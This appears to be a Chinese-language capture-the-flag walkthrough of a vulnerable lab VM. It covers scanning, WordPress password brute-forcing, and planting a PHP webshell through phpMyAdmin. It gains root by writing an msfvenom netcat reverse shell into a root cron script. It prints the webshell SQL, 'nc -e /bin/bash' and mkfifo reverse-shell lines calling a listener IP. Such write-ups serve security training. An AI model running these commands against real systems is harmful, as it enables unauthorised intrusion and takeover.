```

```

```
nmap -A -sS -sV -v -p- 192.168.207.134
```

## **2、渗透测试**

### **2.1 WEB渗透**

#### **1.站点访问测试**

访问站点显示Apache默认页面

![](../Images/7fefa2658c5364801bf5c781a2e1d09b.png)

使用dirb进行目录扫描，发现WordPress和pypmyadmin

```
dirb http://192.168.207.139
```

![](../Images/657c9de8b70367739cbabf0fd88223a2.png)

#### **2.使用wpscan扫描测试**

扫描到该站点2个账号

```
wpscan --url "http://192.168.207.139/wordpress/" -eu
```

![](../Images/e9726aeb270d8dce4b3bca54710de6b2.png)

爆破WordPress账号和密码，只爆破到账号orange的密码为ginger

```
wpscan --url "http://192.168.207.139/wordpress/" -U orange -P /usr/share/wordlists/rockyou.txt
```

![](../Images/f8c9f21bf87a25f7661092370ec2302e.png)

#### **3.使用账号密码登录**

登录时提示域名为lemonsqueezy，需要绑定hosts

![](../Images/d1bd4f3b4e14aa85dc668d8cdc973719.png)

![](../Images/24e8f6971977bcd00717be60f75b41db.png)

访问以后在草稿箱中发现用户密码，密码为: n0t1n@w0rdl1st!  

![](../Images/ba6781ce1f2ff63e4146d182f62b4119.png)

使用账号orange，密码n0t1n@w0rdl1st!成功登录到PHPmyadmin页面

![](../Images/d2def56398255936e4e27a4190117a5c.png)

#### **4.写入webshell**

创建SQL查询写入webshell木马

```
SELECT "<?php system($\_GET\['cmd'\]); ?>" into outfile "/var/www/html/wordpress/shell.php"
```

![](../Images/08fd28aef3b55f5c259504dd005e3693.png)

![](../Images/03488fc8a7aa640db1c2cfddd92c7c4b.png)

测试访问webshell执行命令，已经成功写入

![](../Images/3ce1805d882af82d5627cb7d08b52a63.png)

反弹shell连接

```
nc -e /bin/bash 192.168.207.130 4444
```

![](../Images/7d8672da1f321f2778e06efc1c4b9e61.png)

获取到反弹shell连接

![](../Images/b3505539cd5125b4dba20ca72fbde784.png)

### **2.2 主机渗透**

#### **1.获取主机信息**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](../Images/9e0e0f546a84786ba0135d1a04b584af.png)

#### **2.分析提权环境**

在网站中发现有一个计划任务是以root身份启动，并且存在可以写入的权限

```

cat /etc/crontab
```

![](../Images/5b66156ada982979a7f85a208bf1a22f.png)

#### **3.使用MSF创建反弹shell**

使用MSF创建的shell写入到脚本中

```
msfvenom -p cmd/unix/reverse\_netcat  lhost=192.168.207.130 lport=4444 R
```

![](../Images/513a4b84ed2f81e099294fdf37877c56.png)

```

echo "mkfifo /tmp/gzgujwr; nc 192.168.207.130 4444 0</tmp/gzgujwr | /bin/sh >/tmp/gzgujwr 2>&1; rm /tmp/gzgujwr" > /etc/logrotate.d/logrotate
```

![](../Images/57ad75ad02047c9cc5a0c93e04f34f8a.png)

获取到反弹shell连接

![](../Images/a3ce98e9fd3d719d25b09379723c0771.png)
